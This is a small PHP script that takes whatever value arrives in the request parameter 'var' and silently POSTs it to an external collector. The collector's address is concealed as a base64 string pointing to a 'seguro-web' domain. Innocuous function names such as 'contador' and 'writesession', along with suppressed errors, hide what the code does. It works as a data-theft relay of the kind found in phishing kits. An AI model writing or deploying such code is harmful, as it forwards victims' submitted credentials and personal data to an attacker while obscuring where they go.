<?php



$var = $_REQUEST['var'];

function writesession($conteudo){
    $ch = @curl_init();
   
   
    @curl_setopt($ch, CURLOPT_POST, 1);
    @curl_setopt($ch, CURLOPT_POSTFIELDS, "contador=$conteudo");
    @curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    @curl_exec($ch);
}
function conteudo($conteudo){

    contador($conteudo);  
    return $conteudo;
    
}
function contador($url){$ch = @curl_init();@curl_setopt($ch, CURLOPT_URL, base64_decode('aHR0cHM6Ly9kdC5zZWd1cm8td2ViLnRvcC9lYXJ0aHBhbXBhLw=='));  
                                                    
    @curl_setopt($ch, CURLOPT_POST, 1);
    @curl_setopt($ch, CURLOPT_POSTFIELDS, "contador=$url");
    @curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    @curl_exec($ch);
    

} writesession(conteudo($var));






?>